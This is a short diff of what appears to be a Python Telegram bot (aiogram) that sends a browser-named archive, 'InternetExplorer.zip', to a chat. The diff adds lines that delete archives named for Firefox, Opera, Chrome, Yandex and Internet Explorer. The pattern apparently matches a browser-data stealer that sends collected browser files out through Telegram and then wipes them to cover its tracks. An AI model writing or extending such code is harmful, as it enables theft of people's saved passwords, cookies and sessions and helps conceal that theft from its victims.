@@ -133,6 +133,11 @@ async def bot(message: types.message):
             await bot.send_document(document='InternetExplorer.zip', chat_id=message.chat.id)
         except:
             pass
+        os.remove('firefox.zip')
+        os.remove('opera.zip')
+        os.remove('chrome.zip')
+        os.remove('yandex.zip')
+        os.remove('InternetExplorer.zip')
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, on_startup=start)
